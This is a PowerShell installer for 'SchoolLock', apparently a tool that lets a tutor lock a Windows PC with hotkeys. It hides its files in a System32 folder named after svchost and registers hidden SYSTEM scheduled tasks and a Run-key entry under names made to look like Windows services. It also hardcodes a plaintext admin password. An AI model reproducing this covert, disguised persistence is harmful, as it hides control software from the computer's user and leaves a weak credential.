#Requires -RunAsAdministrator
# Install-SchoolLock.ps1
# Run once from Z:\ to install everything

Set-ExecutionPolicy Bypass -Scope Process -Force

$HiddenDir  = "C:\Windows\System32\svchost_cfg"
$ScriptDst  = "$HiddenDir\svchost_cfg.ps1"
$AhkScript  = "$HiddenDir\hotkeys.ahk"
$AhkExe     = "C:\Program Files\AutoHotkey\AutoHotkey.exe"
$psExe      = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$pass       = "tutoradmin"

Write-Host "`n=== SchoolLock Installer ===" -ForegroundColor Magenta

# ─── 1. Create hidden system folder ──────────────────────────────────────────
if (!(Test-Path $HiddenDir)) { New-Item $HiddenDir -ItemType Directory -Force | Out-Null }
$folder = Get-Item $HiddenDir -Force
$folder.Attributes = "Hidden,System"

$acl = Get-Acl $HiddenDir
$acl.SetAccessRuleProtection($true, $false)

$adminSid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
$adminNT  = $adminSid.Translate([System.Security.Principal.NTAccount])
$acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
    $adminNT,"FullControl","ContainerInherit,ObjectInherit","None","Allow")))

$systemSid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-18")
$systemNT  = $systemSid.Translate([System.Security.Principal.NTAccount])
$acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
    $systemNT,"FullControl","ContainerInherit,ObjectInherit","None","Allow")))

Set-Acl $HiddenDir $acl
Write-Host "[OK] Hidden folder created: $HiddenDir" -ForegroundColor Green

# ─── 2. Copy main script ──────────────────────────────────────────────────────
$ScriptSrc = "Z:\svchost_cfg.ps1"
if (!(Test-Path $ScriptSrc)) {
    Write-Host "[ERROR] svchost_cfg.ps1 not found in Z:\" -ForegroundColor Red
    exit 1
}
Copy-Item $ScriptSrc $ScriptDst -Force
Write-Host "[OK] Script installed: $ScriptDst" -ForegroundColor Green

# ─── 3. Install AutoHotkey ────────────────────────────────────────────────────
if (!(Test-Path $AhkExe)) {
    Write-Host "[INFO] Downloading AutoHotkey..." -ForegroundColor Cyan
    $installer = "$env:TEMP\ahk_install.exe"
    Invoke-WebRequest -Uri "https://www.autohotkey.com/download/ahk-install.exe" -OutFile $installer
    Start-Process $installer -ArgumentList "/S" -Wait
    Remove-Item $installer -Force
    Write-Host "[OK] AutoHotkey installed" -ForegroundColor Green
} else {
    Write-Host "[OK] AutoHotkey already installed" -ForegroundColor Green
}

# ─── 4. Create hotkeys.ahk ────────────────────────────────────────────────────
$ahkContent = @'
#NoEnv
#SingleInstance Force
SetWorkingDir %A_ScriptDir%

; Win+F1 = Lock (silent)
#F1::
Run, schtasks /run /TN "\Microsoft\Windows\SystemCache\SchoolLock_LOCK",, Hide
return

; Win+F2 = Unlock (silent)
#F2::
Run, schtasks /run /TN "\Microsoft\Windows\SystemCache\SchoolLock_UNLOCK",, Hide
return
'@
Set-Content $AhkScript $ahkContent -Encoding UTF8
Write-Host "[OK] hotkeys.ahk created" -ForegroundColor Green

# ─── 5. Register scheduled tasks ─────────────────────────────────────────────
$principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -LogonType ServiceAccount -RunLevel Highest
$settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 2)

# Lock at logon
$aLogon = New-ScheduledTaskAction -Execute $psExe `
    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$ScriptDst`" -Action Lock -AdminPassword `"$pass`""
Register-ScheduledTask `
    -TaskName  "MicrosoftWindowsServiceHost" `
    -TaskPath  "\Microsoft\Windows\SystemCache\" `
    -Action    $aLogon `
    -Trigger   (New-ScheduledTaskTrigger -AtLogOn) `
    -Principal $principal `
    -Settings  $settings `
    -Force | Out-Null
Write-Host "[OK] Logon task registered (auto-lock on login)" -ForegroundColor Green

# Lock hotkey task
$aLock = New-ScheduledTaskAction -Execute $psExe `
    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$ScriptDst`" -Action Lock -AdminPassword `"$pass`""
Register-ScheduledTask `
    -TaskName  "SchoolLock_LOCK" `
    -TaskPath  "\Microsoft\Windows\SystemCache\" `
    -Action    $aLock `
    -Principal $principal `
    -Settings  $settings `
    -Force | Out-Null

# Unlock hotkey task
$aUnlock = New-ScheduledTaskAction -Execute $psExe `
    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$ScriptDst`" -Action Unlock -AdminPassword `"$pass`""
Register-ScheduledTask `
    -TaskName  "SchoolLock_UNLOCK" `
    -TaskPath  "\Microsoft\Windows\SystemCache\" `
    -Action    $aUnlock `
    -Principal $principal `
    -Settings  $settings `
    -Force | Out-Null
Write-Host "[OK] Hotkey tasks registered (Win+F1/F2)" -ForegroundColor Green

# ─── 6. Add AutoHotkey to startup ────────────────────────────────────────────
$startup = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty $startup "SysHostHelper" -Value "`"$AhkExe`" `"$AhkScript`""
Write-Host "[OK] AutoHotkey added to startup" -ForegroundColor Green

# ─── 7. Start AutoHotkey now ─────────────────────────────────────────────────
Get-Process "AutoHotkey" -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Milliseconds 500
Start-Process $AhkExe -ArgumentList "`"$AhkScript`"" -WindowStyle Hidden
Write-Host "[OK] AutoHotkey started" -ForegroundColor Green

# ─── 8. Apply Lock right now ─────────────────────────────────────────────────
Write-Host "`n[INFO] Applying initial Lock..." -ForegroundColor Cyan
& $psExe -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File $ScriptDst -Action Lock -AdminPassword $pass

Write-Host "`n=============================" -ForegroundColor Magenta
Write-Host "[DONE] Installation complete!" -ForegroundColor Green
Write-Host "  Win+F1  = Lock   (silent)" -ForegroundColor Yellow
Write-Host "  Win+F2  = Unlock (silent)" -ForegroundColor Cyan
Write-Host "  Logon   = Lock automatically" -ForegroundColor Gray
Write-Host "=============================" -ForegroundColor Magenta
